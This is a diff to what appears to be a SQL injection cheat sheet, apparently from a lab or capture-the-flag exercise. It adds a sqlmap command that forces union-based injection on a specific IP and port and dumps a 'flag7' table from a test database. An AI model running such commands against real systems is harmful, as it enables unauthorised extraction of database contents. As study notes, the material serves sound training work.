@@ -3,6 +3,11 @@
 
 ```bash
 sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
+
+# with specified columns
+sqlmap -u http://154.57.164.61:31255/case7.php?id=1 -p id --union-cols=5 -D testdb -T flag7 --batch --dump --no-cast
+
+
 ```
 
 ## HTTP Request Type
